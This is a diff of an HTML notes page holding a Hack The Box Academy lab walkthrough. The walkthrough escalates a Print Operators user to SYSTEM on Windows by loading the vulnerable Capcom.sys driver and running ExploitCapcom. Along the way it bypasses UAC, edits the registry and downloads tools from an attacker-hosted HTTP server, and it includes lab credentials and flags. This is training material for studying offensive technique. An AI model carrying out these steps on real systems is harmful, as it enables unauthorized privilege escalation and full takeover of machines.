@@ -20603,24 +20603,162 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div></td></tr></table></div>
 <p>Results: Dll_abus3_ftw!  </p>
 <p><strong>RDP to  with user "printsvc" and password "HTB_@cademy_stdnt!". Follow the steps in this section to escalate privileges to SYSTEM, and submit the contents of the flag.txt file on administrator's Desktop. Necessary tools for both methods can be found in the C:\Tools directory, or you can practice compiling and uploading them on your own.</strong></p>
-<p>```
-xfreerdp /v:10.129.43.31 /u:printsvc /p:HTB_@cademy_stdnt! /cert:ignore</p>
-<h1 id="generating-the">Generating the</h1>
-<p>wget http://10.10.14.39/EnableSeLoadDriverPrivilege.exe -outfile EnableSeLoadDriverPrivilege.exe</p>
-<p>wget http://10.10.14.39/Capcom.sys -outfile Capcom.sys</p>
-<p>wget http://10.10.14.39/DriverView.exe -outfile DriverView.exe</p>
-<p>mkdir c:\test\</p>
-<p>copy Capcom.sys c:\test\Capcom.sys</p>
-<p>reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys" /f</p>
-<p>reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1 /f</p>
-<h1 id="verify-driver-is-not-loaded">Verify Driver is not Loaded</h1>
-<p>.\DriverView.exe /stext drivers.txt
-cat drivers.txt | Select-String -pattern Capcom</p>
-<p>Invoke-FileUpload -Uri http://10.10.14.39:8000/upload -File C:\Tools\lala\drivers\etc\hosts</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>xfreerdp /v:10.129.217.105 /u:printsvc /p:HTB_@cademy_stdnt! /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<p>Check our group membershipts:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
+</span></code></pre></div></td></tr></table></div>
+<p>We see Print Operators, which usually has the SeLoadDriverPrivilege. However when we check our permissions is not listed:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span></code></pre></div></td></tr></table></div>
+<p>If we issue the command <code>whoami /priv</code>, and don't see the <code>SeLoadDriverPrivilege</code> from an unelevated context, we will need to bypass UAC. 
+    - You can bypass it with  <a href="https://github.com/hfiref0x/UACME">UACMe</a> repo features or any similar code approach.
+    - You can also bypass it from user interface. Open a powershell with administrator permissions.     </p>
+<p>If disabled, enabled SeLoadDriverPrivilege. Now, next troubleshooting is that the <code>SeLoadDriverPrivilege</code> may be Disabled. To enable it, we will need the following:</p>
+<ul>
+<li>The executable <code>EnableSeLoadDriverPrivilege.exe</code> that we can compile using the forked repo <a href="https://github.com/amandaguglieri/enabling-privileges">https://github.com/amandaguglieri/enabling-privileges</a>.  </li>
+<li>The file Capcom.sys. I've forked it to <a href="https://github.com/amandaguglieri/Capcom-Rootkit/blob/master/Driver/Capcom.sys">https://github.com/amandaguglieri/Capcom-Rootkit/blob/master/Driver/Capcom.sys</a></li>
+<li>The DriverView.exe utility, officially available at <a href="https://www.nirsoft.net/utils/driverview.html">https://www.nirsoft.net/utils/driverview.html</a> and in my case, also uploaded to <a href="https://github.com/amandaguglieri/hackinglife/blob/main/docs/files/DriverView.exe">my repo</a>.</li>
+</ul>
+<p>Compiling <code>EnableSeLoadDriverPrivilege.exe</code> . I've set up Visual Studio 2022 in a Windows Virtual Machine. </p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-23-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-23-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-23-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-23-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-23-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-23-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-23-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-23-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-23-10">10</a></span>
+<span class="normal"><a href="#__codelineno-23-11">11</a></span>
+<span class="normal"><a href="#__codelineno-23-12">12</a></span>
+<span class="normal"><a href="#__codelineno-23-13">13</a></span>
+<span class="normal"><a href="#__codelineno-23-14">14</a></span>
+<span class="normal"><a href="#__codelineno-23-15">15</a></span>
+<span class="normal"><a href="#__codelineno-23-16">16</a></span>
+<span class="normal"><a href="#__codelineno-23-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a># Clone my forked repo
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a>https://github.com/amandaguglieri/enabling-privileges
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3"></a>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4"></a># Add the following libraries to the EnableSeLoadDriverPrivilege.cpp file
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5"></a>#include &lt;windows.h&gt;
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6"></a>#include &lt;assert.h&gt;
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7"></a>#include &lt;winternl.h&gt;
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8"></a>#include &lt;sddl.h&gt;
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9"></a>#pragma comment(lib,&quot;advapi32.lib&quot;) 
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10"></a>#pragma comment(lib,&quot;user32.lib&quot;) 
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11"></a>#pragma comment(lib,&quot;Ntdll.lib&quot;)
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12"></a>#include &lt;stdio.h&gt;
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13"></a>#include &quot;tchar.h&quot;
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14"></a>
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15"></a># Now, from the terminal (CTRL+ñ), compile:
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16"></a>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17"></a># This will generate the required EnableSeLoadDriverPrivilege.exe. Save it to the folder from where you want to serve the payload to the target host.
+</span></code></pre></div></td></tr></table></div>
+<p>Download the other required files (<code>Capcom.sys</code>  and <code>DriverView.exe</code>) to the folder from where you want to serve the payload to the target host.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span>
+<span class="normal"><a href="#__codelineno-24-2">2</a></span>
+<span class="normal"><a href="#__codelineno-24-3">3</a></span>
+<span class="normal"><a href="#__codelineno-24-4">4</a></span>
+<span class="normal"><a href="#__codelineno-24-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a># Download Capcom.sys
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2"></a>wget https://github.com/amandaguglieri/enabling-privileges/blob/master/Capcom.sys
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3"></a>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4"></a># Download DriverView.exe
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5"></a>wget https://github.com/amandaguglieri/hackinglife/blob/main/docs/files/DriverView.exe
+</span></code></pre></div></td></tr></table></div>
+<p>Serve the files to the target host:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a>python3 -m http.server 80
+</span></code></pre></div></td></tr></table></div>
+<p>Download the files to the target host:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span>
+<span class="normal"><a href="#__codelineno-26-2">2</a></span>
+<span class="normal"><a href="#__codelineno-26-3">3</a></span>
+<span class="normal"><a href="#__codelineno-26-4">4</a></span>
+<span class="normal"><a href="#__codelineno-26-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a><span class="c"># open a powershell terminal and change the directory for instance to C:\Tools</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3"></a><span class="nb">wget </span><span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">39</span><span class="p">/</span><span class="n">EnableSeLoadDriverPrivilege</span><span class="p">.</span><span class="n">exe</span> <span class="n">-outfile</span> <span class="n">EnableSeLoadDriverPrivilege</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4"></a><span class="nb">wget </span><span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">39</span><span class="p">/</span><span class="n">Capcom</span><span class="p">.</span><span class="n">sys</span> <span class="n">-outfile</span> <span class="n">Capcom</span><span class="p">.</span><span class="n">sys</span>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5"></a><span class="nb">wget </span><span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">39</span><span class="p">/</span><span class="n">DriverView</span><span class="p">.</span><span class="n">exe</span> <span class="n">-outfile</span> <span class="n">DriverView</span><span class="p">.</span><span class="n">exe</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Save the <code>Capcom.sys</code> driver from <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">here</a>, and save it to <code>C:\test</code>. If test does not exist, create it:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span>
+<span class="normal"><a href="#__codelineno-27-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a><span class="n">mkdir</span> <span class="n">c</span><span class="p">:\</span><span class="n">test</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2"></a><span class="nb">copy </span><span class="n">Capcom</span><span class="p">.</span><span class="n">sys</span> <span class="n">c</span><span class="p">:\</span><span class="n">test</span><span class="p">\</span><span class="n">Capcom</span><span class="p">.</span><span class="n">sys</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span>
+<span class="normal"><a href="#__codelineno-28-2">2</a></span>
+<span class="normal"><a href="#__codelineno-28-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">CAPCOM</span> <span class="p">/</span><span class="n">v</span> <span class="n">ImagePath</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&quot;\??\C:\test\Capcom.sys&quot;</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2"></a>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">CAPCOM</span> <span class="p">/</span><span class="n">v</span> <span class="nb">Type </span><span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Using Nirsoft's <a href="http://www.nirsoft.net/utils/driverview.html">DriverView.exe</a>, we can verify that the Capcom.sys driver is not loaded.</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span>
+<span class="normal"><a href="#__codelineno-29-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a><span class="p">.\</span><span class="n">DriverView</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">stext</span> <span class="n">drivers</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2"></a><span class="nb">cat </span><span class="n">drivers</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-pattern</span> <span class="n">Capcom</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Run the <code>EnableSeLoadDriverPrivilege.exe</code> binary.</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a><span class="p">.\</span><span class="n">EnableSeLoadDriverPrivilege</span><span class="p">.</span><span class="n">exe</span>
+</span></code></pre></div></td></tr></table></div>
+<p>The Output should be something like this:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-31-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-31-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-31-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-31-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-31-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-31-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-31-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-31-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-31-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a><span class="n">whoami</span><span class="p">:</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2"></a><span class="n">INLANEFREIGHT0</span><span class="p">\</span><span class="n">printsvc</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3"></a>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5"></a><span class="n">SeMachineAccountPrivilege</span>        <span class="n">Disabled</span>
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6"></a><span class="n">SeLoadDriverPrivilege</span>            <span class="n">Enabled</span>
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7"></a><span class="n">SeShutdownPrivilege</span>              <span class="n">Disabled</span>
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8"></a><span class="n">SeChangeNotifyPrivilege</span>          <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span>
+</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9"></a><span class="n">SeIncreaseWorkingSetPrivilege</span>    <span class="n">Disabled</span>
+</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10"></a><span class="n">NTSTATUS</span><span class="p">:</span> <span class="n">00000000</span><span class="p">,</span> <span class="n">WinError</span><span class="p">:</span> <span class="n">0</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Next, verify that the Capcom driver is now listed.</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-32-1">1</a></span>
+<span class="normal"><a href="#__codelineno-32-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1"></a><span class="p">.\</span><span class="n">DriverView</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">stext</span> <span class="n">drivers</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2"></a><span class="nb">cat </span><span class="n">drivers</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-pattern</span> <span class="n">Capcom</span>
+</span></code></pre></div></td></tr></table></div>
+<p>The output should be something like this:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-33-1">1</a></span>
+<span class="normal"><a href="#__codelineno-33-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1"></a>Driver Name           : Capcom.sys
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2"></a>Filename              : C:\Tools\Capcom.sys
+</span></code></pre></div></td></tr></table></div>
+<p>Now we will use the <a href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom</a> tool for escalating privileges. I've cloned it into a windows virtual machine with Visual Studio 2022 installed (in my kali machine)</p>
+<ul>
+<li>Open Visual Studio 2022. Clone the project. Once cloned, right click and select "Compile". It's important to change the architecture to x64 in order to compile.</li>
+<li>Executable generated under "C:\Users\vboxuser\source\repos\ExploitCapcom\ExploitCapcom\x64\Release"</li>
+</ul>
+<p>Upload the <code>ExploitCapcom.exe</code> file to the target machine:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-34-1">1</a></span>
+<span class="normal"><a href="#__codelineno-34-2">2</a></span>
+<span class="normal"><a href="#__codelineno-34-3">3</a></span>
+<span class="normal"><a href="#__codelineno-34-4">4</a></span>
+<span class="normal"><a href="#__codelineno-34-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1"></a># from the attacking machine
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2"></a>python3 -m http.server 80
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3"></a>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4"></a># from the target host
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5"></a>wget http://$attackingIP/ExploitCapcom.exe -outfile ExploitCapcom.exe
+</span></code></pre></div></td></tr></table></div>
+<p>Run the binary:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-35-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1"></a><span class="p">.\</span><span class="n">ExploitCapcom</span><span class="p">.</span><span class="n">exe</span>
+</span></code></pre></div></td></tr></table></div>
+<p>This launches a shell with SYSTEM privileges. Now we print the flag.txt:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-36-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1"></a>type c:\Users\Administrator\Desktop
+</span></code></pre></div></td></tr></table></div>
+<p>If for some reason you can not read it, copy the file in order to read it.</p>
+<p>Results:  Pr1nt_0p3rat0rs_ftw!</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 16, 2025 16:20:58"><span class="timeago" datetime="2025-03-16T16:20:58+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 16, 2025 16:20:58">2025-03-16</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 16, 2025 19:36:20"><span class="timeago" datetime="2025-03-16T19:36:20+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 16, 2025 19:36:20">2025-03-16</span></small></br>
 
 
     <small>Created: February 23, 2025 21:12:05</small>
